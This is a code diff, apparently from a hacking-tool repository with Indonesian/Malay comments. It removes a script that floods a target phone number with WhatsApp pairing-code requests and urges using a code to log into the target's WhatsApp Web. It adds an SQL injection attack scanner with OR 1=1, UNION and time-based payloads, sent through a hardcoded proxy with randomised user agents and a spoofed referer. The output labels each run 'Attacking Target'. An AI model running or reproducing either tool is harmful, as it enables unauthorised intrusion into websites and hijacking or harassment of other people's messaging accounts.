@@ -1,48 +1,85 @@
 
-   const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
-const prompt = require('prompt-sync')();
+   const axios = require('axios');
+const userAgent = require('random-useragent');
+const tunnel = require('tunnel');
 const chalk = require('chalk');
+const ora = require('ora');
 const figlet = require('figlet');
+const gradient = require('gradient-string');
+const moment = require('moment');
 
-console.log(chalk.blue(figlet.textSync('SALX', { horizontalLayout: 'full' })));
-console.log(chalk.green('Salxpairing v.1.0'));
-console.log(chalk.yellow('Follow me on GitHub: https://github.com/SalvadorXploitiji\n'));
+const sqlPayloads = [
+    "' OR 1=1 --", "\" OR 1=1 --", "' UNION SELECT null, null, null --",
+    "1' AND 1=1 --", "1' AND 1=2 --", "' OR sleep(5) --", "\" OR sleep(5) --",
+    "' AND benchmark(5000000,MD5(1)) --", "\" AND benchmark(5000000,MD5(1)) --"
+];
 
-// Input dari pengguna
-const targetNumber = prompt(chalk.cyan('Nombor target (dengan kode negara, contoh: +60123456789): '));
-const pairingCount = parseInt(prompt(chalk.cyan('Jumlah pairing: ')), 10);
+const sqlErrors = [
+    "SQL syntax", "mysql_fetch", "ORA-01756", "Microsoft OLE DB Provider",
+    "Unclosed quotation mark", "You have an error in your SQL syntax",
+    "pg_query(): Query failed", "syntax error at or near"
+];
 
-// Validasi input
-if (!targetNumber.startsWith('+') || isNaN(pairingCount) || pairingCount <= 0) {
-    console.log(chalk.red('Input tidak valid! Pastikan nombor target memiliki kode negara dan jumlah pairing adalah angka positif.'));
+const proxyConfig = tunnel.httpsOverHttp({
+    proxy: {
+        host: '52.73.224.54',  // Ganti dengan IP proxy jika perlu
+        port: 3128,
+        auth: 'username:password'
+    }
+});
+
+if (process.argv.length < 3) {
+    console.log(chalk.red("❌ Gunakan: node salxvron.js example.com"));
     process.exit(1);
 }
 
-(async () => {
-    for (let i = 1; i <= pairingCount; i++) {
-        console.log(chalk.yellow(`\n[PAIRING ${i}] Menjalankan sesi pairing...`));
+const target = process.argv[2];
+const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
+const method = "SQL Injection (Error-Based)";
 
-        const { state, saveCreds } = await useMultiFileAuthState(`./session-salx-${i}`);
-        const sock = makeWASocket({
-            auth: state,
-            printQRInTerminal: false // Matikan QR karena kita menggunakan pairing code
-        });
+// Tampilkan Logo SALXVRON
+console.log(gradient.pastel(figlet.textSync("SALX VRON", { horizontalLayout: "full" })));
+console.log(chalk.blue.bold(`\n🚀 SALXVRON - SQLi Scanner`));
+console.log(chalk.green(`🛡️ Attacking Target : ${target}`));
+console.log(chalk.yellow(`⏳ Time: ${startTime}`));
+console.log(chalk.cyan(`⚔️ Method: ${method}\n`));
 
-        sock.ev.on('creds.update', saveCreds);
+async function scanSQLi(url) {
+    console.log(chalk.magentaBright("🔎 Scanning:\n"));
 
-        // Tunggu hingga bot siap untuk pairing
-        sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect, pairingCode } = update;
+    const spinner = ora(chalk.yellow(`Menganalisis ${url}...`)).start();
 
-            if (connection === 'open') {
-                console.log(chalk.green(`[PAIRING ${i}] Pairing sukses untuk nomor ${targetNumber}!`));
-            } else if (pairingCode) {
-                console.log(chalk.blue(`[PAIRING ${i}] Kode Pairing untuk nomor ${targetNumber}: ${pairingCode}`));
-                console.log(chalk.magenta('Gunakan kode ini untuk login di WhatsApp Web target.'));
-            } else if (connection === 'close') {
-                console.log(chalk.red(`[PAIRING ${i}] Pairing gagal!`));
-                if (lastDisconnect?.error) console.log(chalk.red(lastDisconnect.error));
+    for (let payload of sqlPayloads) {
+        let testURL = `${url}${encodeURIComponent(payload)}`;
+        let headers = {
+            'User-Agent': userAgent.getRandom(),
+            'Referer': 'https://google.com',
+        };
+
+        try {
+            let response = await axios.get(testURL, {
+                timeout: 10000,
+                headers: headers,
+                httpsAgent: proxyConfig
+            });
+
+            let responseText = response.data.toString();
+
+            if (sqlErrors.some(error => responseText.includes(error))) {
+                spinner.fail(chalk.redBright(`🔥 [VULNERABLE] ${url}`));
+                return;
             }
-        });
+
+            if (response.status === 500 || response.status === 403) {
+                spinner.warn(chalk.yellowBright(`⚠️ [POTENTIALLY VULNERABLE] ${url}`));
+                return;
+            }
+
+        } catch (error) {
+            continue;
+        }
     }
-})();
+    spinner.succeed(chalk.greenBright(`✅ [SAFE] ${url}`));
+}
+
+scanSQLi(`http://${target}/index.php?id=`);
